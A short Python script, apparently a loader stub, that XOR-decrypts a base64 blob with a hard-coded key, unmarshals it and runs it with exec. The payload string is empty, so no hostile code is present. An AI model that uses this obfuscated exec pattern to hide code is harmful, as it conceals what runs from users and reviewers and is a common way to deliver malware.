
import marshal, base64

def xor_decrypt(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

encoded_code = ''
encoded_key = 'SThZYm9UTGZ1ZDNza2RvdA=='
decrypted_code = xor_decrypt(base64.b64decode(encoded_code), base64.b64decode(encoded_key))
exec(marshal.loads(decrypted_code))
